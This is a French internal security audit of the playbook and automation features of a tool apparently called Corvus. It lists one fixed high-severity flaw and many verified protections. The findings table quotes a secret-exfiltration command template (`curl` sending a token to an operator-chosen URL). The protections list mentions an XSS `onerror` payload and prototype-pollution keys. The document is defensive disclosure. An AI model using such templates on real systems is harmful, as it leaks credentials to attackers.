# Audit de sécurité 1.3.0 (playbooks et automatisation)

Audit interne court mené pendant le jalon 1.3, selon la règle du dépôt : **un test qui exploite le problème d'abord (rouge), puis le correctif**.
Les tests sont dans `test/automation-audit.test.js` ; les garanties permanentes dans `test/automation-*.test.js`, `test/second-barrier.test.js`
et `test/accounts.test.js`.

L'automatisation est le point le plus dangereux de Corvus : elle exécute des commandes sur vos machines sans que personne ne regarde. Tout y est donc
**désactivé par défaut** (interrupteur général `automation.enabled`), **borné** (étapes, durées, sorties, concurrence, fréquence) et **journalisé**.

## Trouvé et corrigé

| # | Gravité | Problème | Correctif | Test |
|---|---|---|---|---|
| 1 | **Haute** | **Un secret pouvait partir vers une destination choisie par celui qui lance le playbook.** Exemple : `curl -H {{secret.TOKEN}} {{url}}` avec un paramètre `url` de type texte : un opérateur (qui ne peut pas lire le secret) saisit l'adresse de son propre serveur, et Corvus y envoie le jeton. Idem avec `mysql -h {{hote}} -p{{secret.DB_PASS}}`, ou un chemin lu puis encodé. | Une commande qui utilise un secret **n'accepte plus de paramètre libre** (`string`, `path`, `host`). Les paramètres bornés d'avance par l'administrateur (liste de choix, entier) restent permis : la destination ne peut pas être choisie. Refus à l'enregistrement (par l'éditeur comme par l'API). | « EXPLOIT » dans `automation-audit.test.js` (rouge avant) |

## Vérifié, rien à corriger (chaque ligne a son test)

| Surface | Résultat |
|---|---|
| **Injection par un paramètre** | Toujours entre quotes POSIX ; le modèle est **refusé** si un paramètre tombe entre quotes, dans un backtick, un commentaire ou avec un heredoc. 18 valeurs hostiles exécutées dans un **vrai shell** : aucune commande injectée. |
| **Injection par le nom d'un playbook** | Lettres, chiffres, espaces et `. _ -` seulement (accents permis) ; jamais interprété. |
| **Sortie réaffichée** | `textContent` partout ; une sortie contenant `<img onerror=…>` s'affiche comme texte (test dans un vrai navigateur), aucun script exécuté. |
| **Opérateur sur un hôte non accordé** | 404 (le playbook n'est même pas visible) ; un droit « viewer » sur l'hôte ne suffit pas ; un compte sans droit ne voit rien. |
| **Opérateur qui édite un playbook, lit un secret, change l'interrupteur** | 403, variantes de casse et de « / » final comprises, avec et sans `accessGuard` (seconde barrière). |
| **Secret lu dans une sortie** | Masqué (forme brute, quotes, JSON, URL, base64, hex) avant toute conservation ; jamais dans une ligne de commande (transmis sur l'entrée standard) ; jamais en clair dans la base, le journal, les alertes, ni le fichier de base. *Limite documentée : une commande qui encode elle-même un secret (rot13, découpage…) peut contourner le masquage.* |
| **Jeton de webhook d'un autre playbook** | Un jeton est lié à **un** playbook ; le corps ne peut contenir que `values` (refus 400 sinon) ; un jeton d'API ordinaire ne lance rien par le webhook, et un jeton de webhook n'ouvre aucune route authentifiée. |
| **Webhook entrant** | Signature HMAC à temps constant, horodatage ±5 min, **rejeu refusé**, refus **uniformes** (même 401, même corps) pour jeton inconnu / signature fausse / corps modifié / horodatage / webhook désactivé, limites par IP (30/min) et par jeton (6/min), limiteur d'échecs, journal non inondable. |
| **Webhook sortant (SSRF)** | Cible définie par un **administrateur** seulement ; http(s) sans identifiants ; adresses lien-local (métadonnées cloud), non spécifiée et multicast refusées, **aussi après résolution DNS** ; **aucune redirection suivie** (testé : la seconde cible ne reçoit rien) ; délai 5 s ; corps minimal signé, **jamais de sortie ni de paramètre**. *Limite : une résolution DNS qui changerait entre le contrôle et l'envoi n'est pas couverte.* |
| **Contourner le refus Windows en changeant l'hôte après coup** | Revérifié à **chaque** exécution (planning, alerte, webhook compris) ; aucune commande n'est envoyée. |
| **Boucle alerte → playbook → alerte** | Les alertes `playbook-*` et `automation-*` ne peuvent jamais déclencher (même avec une ligne forcée en base) ; limitation de fréquence et **coupe-circuit** (N déclenchements en M minutes → désactivé + alerte critique) ; 200 alertes d'affilée ne lancent jamais plus de `maxRuns` playbooks. |
| **Déni de service** | Un seul lancement actif par playbook ; plafond global de lancements simultanés ; concurrence par hôte et globale bornée ; sortie lue bornée (1 Mo) et conservée bornée (64 Ko) ; plafond **strict** du limiteur sur le lancement et l'arrêt d'urgence ; intervalle minimal de 5 min entre deux déclenchements planifiés ; **jamais de rattrapage** après une panne. |
| **Pollution de prototype par les valeurs** | `__proto__`, `constructor`, `toString` : refusés (400). |
| **WebSocket `/ws/automation`** | Authentifié, origine contrôlée, droits revérifiés à chaque évènement (un compte désactivé est déconnecté), aucun message entrant pris en compte, **jamais de sortie de commande** dans les évènements. |
| **Destruction sans confirmation** | Suppression d'un playbook, d'une planification, d'un déclencheur, d'un webhook, d'un secret, retour en arrière : `confirm: true` exigé côté serveur. |

## Ce qui n'a pas pu être testé

- Les playbooks n'ont été exécutés que contre le **faux sshd** (qui lance un vrai `bash`), jamais contre un vrai OpenSSH Linux, un Raspberry Pi ou un hôte distant.
- Le webhook entrant n'a été appelé qu'en local (HTTP), pas à travers Tailscale Serve ni depuis n8n ; le webhook sortant n'a parlé qu'à un serveur HTTP de test, pas à n8n.
- Le cron est testé avec les transitions d'heure de **Paris** et de **New York** (hémisphère nord) ; pas avec des fuseaux à décalage de 30 minutes ni dans l'hémisphère sud.
- La prévisualisation en bac à sable d'un playbook « danger » est testée avec un **faux agent** (agent simulé dans les tests), pas avec un vrai agent Linux aux droits complets.
